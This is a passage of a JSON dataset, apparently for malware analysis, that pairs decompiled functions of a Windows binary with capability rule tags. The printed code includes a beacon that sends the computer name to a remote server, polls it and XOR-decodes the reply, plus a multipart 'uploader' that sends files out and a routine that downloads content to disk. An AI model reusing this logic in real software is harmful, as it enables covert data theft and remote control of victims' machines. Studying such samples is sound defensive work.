            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00403fb0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437e48;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00420756(0);\n    iVar3 = *0x444b54;\n    var_4h = 0;\n    var_10h = *0x444b54;\n    if (*0x443be8 == 0) {\n        uVar4 = 0;\n        fcn.00420756(0);\n        if (*0x443be8 == 0) {\n            *0x443be4 = *0x443be4 + 1;\n            *0x443be8 = *0x443be4;\n        }\n        fcn.0042077e(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x443be8;\n    iVar2 = *unaff_EDI;\n    if (*0x443be8 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x443be8 * 4);\n        if (arg_8h == 0) goto code_r0x0040403c;\ncode_r0x0040405a:\n        if (arg_8h != 0) goto code_r0x004040c3;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x0040403c:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0040405a;\n        iVar2 = fcn.0042034f();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0040405a;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00401910(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.004210f0(\"bad cast\");\n            fcn.00424181(&var_24h, 0x43f87c);\n        }\n        arg_8h = var_10h;\n        *0x444b54 = var_10h;\n        fcn.00420756(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042077e();\n        fcn.004202d8(arg_8h);\n    }\ncode_r0x004040c3:\n    var_4h = 0xffffffff;\n    fcn.0042077e();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 796
    },
    "004040f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004040f0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437e48;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.00420756(0);\n    iVar3 = *0x444b58;\n    var_4h = 0;\n    var_10h = *0x444b58;\n    if (*0x444b60 == 0) {\n        uVar4 = 0;\n        fcn.00420756(0);\n        if (*0x444b60 == 0) {\n            *0x443be4 = *0x443be4 + 1;\n            *0x444b60 = *0x443be4;\n        }\n        fcn.0042077e(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x444b60;\n    iVar2 = *unaff_EDI;\n    if (*0x444b60 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x444b60 * 4);\n        if (arg_8h == 0) goto code_r0x0040417c;\ncode_r0x0040419a:\n        if (arg_8h != 0) goto code_r0x00404203;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x0040417c:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0040419a;\n        iVar2 = fcn.0042034f();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0040419a;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00404250(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.004210f0(\"bad cast\");\n            fcn.00424181(&var_24h, 0x43f87c);\n        }\n        arg_8h = var_10h;\n        *0x444b58 = var_10h;\n        fcn.00420756(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042077e();\n        fcn.004202d8(arg_8h);\n    }\ncode_r0x00404203:\n    var_4h = 0xffffffff;\n    fcn.0042077e();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 794
    },
    "00404300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404300(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *arg_8h;\n    char *pcVar6;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_428h;\n    uint var_424h;\n    char *var_420h;\n    int32_t var_41ch;\n    int32_t var_418h;\n    uchar *var_414h;\n    uint var_410h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437ddb;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_424h = 0;\n    iVar2 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&var_424h, 0, var_10h);\n    if (iVar2 == 0) goto code_r0x004044f3;\n    var_414h = NULL;\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    iVar2 = (*_sym.imp.WININET.dll_InternetOpenA)(*(*0x444b3c + 0x8c), 0, 0, 0, 0);\n    if (iVar2 == 0) goto code_r0x004044f3;\n    iVar3 = (*_sym.imp.WININET.dll_InternetConnectA)(iVar2, param_1, 0x50, 0, 0, 3, 0, 1);\n    var_418h = iVar3;\n    if (iVar3 != 0) {\n        iVar4 = (*_sym.imp.WININET.dll_HttpOpenRequestA)(iVar3, \"POST\", param_2, 0, 0, 0, 0x400000, 1);\n        if (iVar4 != 0) {\n            iVar5 = (*_sym.imp.WININET.dll_HttpSendRequestA)(iVar4, 0, 0, 0, 0);\n            if (iVar5 != 0) {\n                arg_8h = fcn.00422819(1);\n                var_41ch = 0;\n                var_4h = 0;\n                var_420h = arg_8h;\n                iVar5 = (*_sym.imp.WININET.dll_InternetReadFile)(iVar4, &var_410h, 0x3ff, &var_414h);\n                if (iVar5 == 0) {\ncode_r0x004044b6:\n                    var_414h = fcn.0041ff97(8);\n                    *var_414h = 0;\n                }\n                else {\n                    do {\n                        if (var_414h == NULL) break;\n                        *(&var_410h + var_414h) = 0;\n                        fcn.004050e0(&var_410h);\n                        iVar3 = (*_sym.imp.WININET.dll_InternetReadFile)(iVar4, &var_410h, 0x3ff, &var_414h);\n                    } while (iVar3 != 0);\n                    arg_8h = var_420h;\n                    iVar3 = var_418h;\n                    if (var_41ch < 1) goto code_r0x004044b6;\n                    var_414h = fcn.0041ff97(var_41ch + 1);\n                    pcVar6 = var_420h;\n                    do {\n                        cVar1 = *pcVar6;\n                        pcVar6[var_414h - var_420h] = cVar1;\n                        pcVar6 = pcVar6 + 1;\n                        arg_8h = var_420h;\n                        iVar3 = var_418h;\n                    } while (cVar1 != '\\0');\n                }\n                fcn.004214f1(arg_8h);\n            }\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar4);\n        }\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar3);\n    }\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar2);\ncode_r0x004044f3:\n    *in_FS_OFFSET = var_ch;\n    fcn.00420bc6(unaff_ESI);\n    return;\n}\n",
        "token_count": 1037
    },
    "00404510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404510(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint unaff_ESI;\n    uint arg_8h_00;\n    uint var_418h;\n    uint var_414h;\n    int32_t var_410h;\n    uint var_40ch;\n    int32_t var_408h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    var_408h = arg_8h;\n    var_414h = 0;\n    iVar2 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&var_414h, 0);\n    if (iVar2 != 0) {\n        var_40ch = 0;\n        fcn.004227e9(in_EDX);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_8h_00 = 0;\n        iVar2 = (*_sym.imp.WININET.dll_InternetOpenA)(*(*0x444b3c + 0x8c), 0, 0, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.WININET.dll_InternetConnectA)(iVar2);\n            var_410h = iVar3;\n            if (iVar3 != 0) {\n                iVar4 = (*_sym.imp.WININET.dll_HttpOpenRequestA)(iVar3, 0x43c484, var_408h, 0, 0, 0, 0x400000, 1);\n                if (iVar4 != 0) {\n                    iVar5 = (*_sym.imp.WININET.dll_HttpSendRequestA)(iVar4, 0, 0, 0, 0);\n                    if (iVar5 != 0) {\n                        var_40ch = 1;\n                        iVar5 = fcn.00421d73(in_EDX, 0x43c304);\n                        pcVar1 = _sym.imp.WININET.dll_InternetReadFile;\n                        iVar3 = var_410h;\n                        if (iVar5 != 0) {\n                            while ((iVar3 = (*pcVar1)(iVar4, &var_404h, 0x3ff, &var_408h),  iVar3 != 0 &&\n                                   (var_408h != 0))) {\n                                *(&var_404h + var_408h) = 0;\n                                fcn.004222be(&var_404h, 1, var_408h, iVar5);\n                            }\n                            fcn.004226f5(iVar5);\n                            iVar3 = var_410h;\n                        }\n                    }\n                    (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar4);\n                }\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar3);\n            }\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar2);\n        }\n        fcn.00420bc6(arg_8h_00);\n        return;\n    }\n    fcn.00420bc6(unaff_ESI);\n    return;\n}\n",
        "token_count": 750
    },
    "004046c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n\nvoid __cdecl fcn.004046c0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *arg_8h_00;\n    uint arg_8h_01;\n    char *pcVar7;\n    char *in_ECX;\n    int32_t iVar8;\n    uint *puVar9;\n    uint arg_8h_02;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_8h_02 = 0;\n        iVar2 = (*_sym.imp.WININET.dll_InternetOpenA)(*(*0x444b3c + 0x8c), 0, 0, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.WININET.dll_InternetConnectA)(iVar2);\n            if (iVar3 != 0) {\n                *arg_10h = 0x8468c200;\n                iVar4 = (*_sym.imp.WININET.dll_HttpOpenRequestA)(iVar3, \"POST\");\n                if (iVar4 != 0) {\n                    puVar6 = \"---------------------------uploader\";\n                    puVar9 = &var_2ch;\n                    for (iVar8 = 9; iVar8 != 0; iVar8 = iVar8 + -1) {\n                        *puVar9 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        puVar9 = puVar9 + 1;\n                    }\n                    pcVar5 = in_ECX;\n                    do {\n                        cVar1 = *pcVar5;\n                        pcVar5 = pcVar5 + 1;\n                    } while (cVar1 != '\\0');\n                    puVar6 = &var_2ch;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    pcVar5 = fcn.0041ff97(pcVar5 + puVar6 + ((0x100 - (&var_2ch + 1)) - (in_ECX + 1)));\n                    fcn.00420bd5(pcVar5, \"Host: %s\\r\\nContent-Type: multipart/form-data; boundary=%s\", in_ECX);\n                    puVar6 = &var_2ch;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    arg_8h_00 = fcn.0041ff97(puVar6 + (0x423 - (&var_2ch + 1)));\n                    fcn.00420bd5(arg_8h_00, \n                                 \"--%s\\r\\nContent-Disposition: form-data; name=\\\"%s\\\"; filename=\\\"file.raw\\\"\\r\\nContent-Type: %s\\r\\n\\r\\n\"\n                                 , &var_2ch);\n                    arg_8h_01 = fcn.00422819(1);\n                    pcVar7 = arg_8h_00;\n                    do {\n                        cVar1 = *pcVar7;\n                        pcVar7 = pcVar7 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.00405060(arg_8h_00);\n                    fcn.00405060(arg_8h);\n                    fcn.00405060(\"\\r\\n--\");\n                    puVar6 = &var_2ch;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    fcn.00405060(&var_2ch);\n                    fcn.00405060(\"--\\r\\n\");\n                    pcVar7 = pcVar5;\n                    do {\n                        cVar1 = *pcVar7;\n                        pcVar7 = pcVar7 + 1;\n                    } while (cVar1 != '\\0');\n                    (*_sym.imp.WININET.dll_HttpSendRequestA)(iVar4, pcVar5, pcVar7 - (pcVar5 + 1), arg_8h_01, 0);\n                    fcn.00420c59(arg_8h_00);\n                    fcn.00420c59(pcVar5);\n                    (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar4);\n                    fcn.004214f1(arg_8h_01);\n                }\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar3);\n            }\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar2);\n        }\n        fcn.00420bc6(arg_8h_02);\n        return;\n    }\n    fcn.00420bc6(var_48h);\n    return;\n}\n",
        "token_count": 1220
    },
    "00404f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404f80(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint in_EAX;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t arg_14h;\n    char *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401db0(in_EAX);\n    iVar2 = fcn.00405200(arg_8h_00, 1);\n    if (iVar2 < 0) {\n        pcVar3 = in_ECX;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        if (-(pcVar3 - (in_ECX + 1)) <= iVar2) goto code_r0x00405044;\n    }\n    arg_14h = fcn.00421d73(arg_8h, 0x43c304);\n    if (arg_14h != 0) {\n        if (arg_ch == '\\0') {\n            pcVar3 = in_ECX + 1;\n            do {\n                cVar1 = *in_ECX;\n                in_ECX = in_ECX + 1;\n            } while (cVar1 != '\\0');\n            pcVar3 = in_ECX + (iVar2 - pcVar3);\n            iVar2 = 0;\n        }\n        else {\n            pcVar3 = NULL;\n        }\n        for (; pcVar3 < iVar2; pcVar3 = pcVar3 + 1) {\n            fcn.004222be(pcVar3 + arg_8h_00, 1, 1, arg_14h);\n        }\n        fcn.004226f5(arg_14h);\n        fcn.00420c59(arg_8h_00);\n        return 1;\n    }\ncode_r0x00405044:\n    fcn.00420c59(arg_8h_00);\n    return 0;\n}\n",
        "token_count": 465
    },
    "00405130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00405130(char *arg_8h, uint arg_ch, uint arg_10h, uchar *arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EDI;\n    bool bVar5;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = pcVar2 - (arg_8h + 1);\n    iVar4 = 0;\n    if (iVar3 <= *unaff_EDI) {\n        return 0;\n    }\n    bVar5 = arg_ch == '\\0';\n    while( true ) {\n        cVar1 = arg_8h[*unaff_EDI];\n        if (bVar5) break;\ncode_r0x004051ba:\n        if (cVar1 == arg_ch) {\n            bVar5 = true;\n        }\n        *unaff_EDI = *unaff_EDI + 1;\n        if (iVar3 <= *unaff_EDI) {\n            return 0;\n        }\n    }\n    if (arg_10h == '\\0') {\n        if ((((cVar1 != ' ') && (cVar1 != '\\r')) && (cVar1 != '\\n')) && (cVar1 != '\\0')) {\ncode_r0x004051aa:\n            if (*unaff_EDI < iVar3 + -1) {\n                if (arg_14h != NULL) {\n                    arg_14h[iVar4] = cVar1;\n                }\n                iVar4 = iVar4 + 1;\n                goto code_r0x004051ba;\n            }\n            if (arg_14h != NULL) {\n                arg_14h[iVar4] = cVar1;\n            }\n            iVar4 = iVar4 + 1;\n            if (arg_18h <= iVar4) goto code_r0x004051e9;\n        }\n    }\n    else if (cVar1 != arg_10h) goto code_r0x004051aa;\n    if (arg_14h != NULL) {\n        arg_14h[iVar4] = 0;\n    }\ncode_r0x004051e9:\n    *unaff_EDI = *unaff_EDI + 1;\n    return 1;\n}\n",
        "token_count": 596
    },
    "00405200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405200(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *unaff_EBX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = unaff_EBX;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = pcVar2 - (unaff_EBX + 1);\n    iVar4 = (in_ECX - iVar3) + -1;\n    iVar6 = 0;\n    var_4h = -1;\n    iVar5 = -1;\n    if (0 < iVar4) {\n        do {\n            iVar5 = 0;\n            if (0 < iVar3) {\n                do {\n                    if (*(iVar6 + arg_8h + iVar5) != unaff_EBX[iVar5]) goto code_r0x0040525d;\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < iVar3);\n            }\n            var_4h = iVar6;\n            if (arg_ch == '\\0') {\n                return iVar6;\n            }\ncode_r0x0040525d:\n            iVar6 = iVar6 + 1;\n            iVar5 = var_4h;\n        } while (iVar6 < iVar4);\n    }\n    return iVar5;\n}\n",
        "token_count": 358
    },
    "00405270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405270(void)\n\n{\n    uint unaff_ESI;\n    uint *arg_8h;\n    uint lpVersionInformation;\n    int32_t var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x441480 ^ &stack0xfffffffc;\n    arg_8h = &lpVersionInformation;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.DLL_GetVersionExA)();\n    if (var_94h == 6) {\n        if (var_90h == 2) {\n            fcn.00420bd5(unaff_ESI, \"Windows 8 build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n        if (var_90h == 1) {\n            fcn.00420bd5(unaff_ESI, \"Windows 7 build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n        if (var_90h == 0) {\n            fcn.00420bd5(unaff_ESI, \"Windows Vista build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n    }\n    else if (var_94h == 5) {\n        if (var_90h == 2) {\n            fcn.00420bd5(unaff_ESI, \"Windows Server 2003 build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n        if (var_90h == 1) {\n            fcn.00420bd5(unaff_ESI, \"Windows XP build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n        if (var_90h == 0) {\n            fcn.00420bd5(unaff_ESI, \"Windows 2000 build %i\", var_8ch);\n            fcn.00420bc6(arg_8h);\n            return;\n        }\n    }\n    fcn.00420bd5(unaff_ESI, \"Windows %i.%i build %i\", var_94h);\n    fcn.00420bc6(arg_8h);\n    return;\n}\n",
        "token_count": 532
    },
    "00405f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00405f40(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    ushort *puVar8;\n    uint *puVar9;\n    uint nSize;\n    \n    if (*0x444a84 == '\\0') {\n        puVar3 = fcn.004053d0();\n        iVar4 = 0;\n        if (puVar3 != NULL) {\n            puVar5 = puVar3;\n            do {\n                cVar2 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar2 != '\\0');\n            iVar4 = puVar5 - (puVar3 + 1);\n        }\n        *0x444a58 = fcn.0041ff97(iVar4 + 0x104);\n        nSize = 0x100;\n        (*_sym.imp.KERNEL32.DLL_GetComputerNameA)(*0x444a58, &nSize);\n        iVar4 = *0x444a58;\n        if (puVar3 != NULL) {\n            puVar8 = *0x444a58 + -1;\n            do {\n                pcVar1 = puVar8 + 1;\n                puVar8 = puVar8 + 1;\n            } while (*pcVar1 != '\\0');\n            *puVar8 = *0x43c7b0;\n            puVar5 = puVar3;\n            do {\n                cVar2 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar2 != '\\0');\n            puVar9 = iVar4 + -1;\n            do {\n                pcVar1 = puVar9 + 1;\n                puVar9 = puVar9 + 1;\n            } while (*pcVar1 != '\\0');\n            puVar7 = puVar3;\n            for (uVar6 = puVar5 - puVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar9 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            for (uVar6 = puVar5 - puVar3 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                *puVar9 = *puVar7;\n                puVar7 = puVar7 + 1;\n                puVar9 = puVar9 + 1;\n            }\n            fcn.00420c59(puVar3);\n        }\n        *0x444a84 = '\\x01';\n    }\n    return *0x444a58;\n}\n",
        "token_count": 626
    },
    "00406360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406360(void)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    code *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint arg_8h;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    pcVar4 = *(*0x444b3c + 0x94);\n    pcVar6 = pcVar4 + 1;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = fcn.00405f40();\n    pcVar7 = pcVar5 + 1;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h = fcn.0041ff97(pcVar4 + pcVar5 + ((0x20 - pcVar7) - pcVar6));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    arg_10h = *(*0x444b3c + 0x94);\n    fcn.00405f40();\n    fcn.00420bd5(arg_8h, \"%s?get&news_slist&comp=%s\", arg_10h);\n    pcVar3 = _sym.imp.KERNEL32.DLL_Sleep;\n    while( true ) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar6 = fcn.00404300();\n        if (pcVar6 != NULL) break;\n        (*pcVar3)(30000);\n    }\n    fcn.00420c59(arg_8h);\n    pcVar4 = pcVar6;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    if (pcVar4 != pcVar6 + 1) {\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar7 = *(*0x444b3c + 8);\n        pcVar4 = pcVar7 + 1;\n        do {\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        pcVar5 = pcVar6;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar2 = *(*0x444b3c + 8);\n        iVar8 = 0;\n        iVar9 = 0;\n        if (0 < pcVar5 - (pcVar6 + 1)) {\n            do {\n                if (pcVar7 - pcVar4 <= iVar9) {\n                    iVar9 = 0;\n                }\n                pcVar6[iVar8] = pcVar6[iVar8] ^ -*(iVar9 + iVar2);\n                iVar8 = iVar8 + 1;\n                iVar9 = iVar9 + 1;\n            } while (iVar8 < pcVar5 - (pcVar6 + 1));\n        }\n        if (*0x444a80 == 0) {\n            *0x444a80 = fcn.0041ff97(0x100);\n        }\n        fcn.00422b02(pcVar6, 0x43c744, *0x444a80);\n    }\n    fcn.00420c59(pcVar6);\n    return;\n}\n",
        "token_count": 944
    },
    "00406500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
